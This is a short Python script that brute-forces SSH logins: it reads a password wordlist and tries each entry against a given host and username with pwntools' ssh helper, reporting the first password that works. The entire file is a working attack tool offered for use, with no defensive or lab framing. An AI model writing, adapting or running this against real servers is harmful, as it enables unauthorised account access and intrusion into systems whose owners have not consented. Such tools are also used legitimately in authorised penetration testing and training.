from urllib import response
from pwn import *
import paramiko
import sys
import socket

print(sys.argv)
if len(sys.argv) == 4:
  host = socket.gethostbyname(sys.argv[1])
  username = sys.argv[2]
  wordlist = sys.argv[3]
  attempts = 0

  with open(wordlist, "r") as password_list:
    for password in password_list:
      password = password.strip("\n")
      try:
        print("[{}] Attempting password: '{}'!".format(attempts, password))
        response = ssh(host=host, user=username, password=password, timeout=1)
        if response.connected():
          print("[>] Valid password found: '{}'!".format(password))
          response.close()
          break
        response.close()
      except paramiko.ssh_exception.AuthenticationException:
        print("[X] Invalid password!")
      attempts += 1
else:
  print("Invalid amount of arguments.")
  print("Syntax: python3 ssh_bruteforce.py <host> <username> <password-list")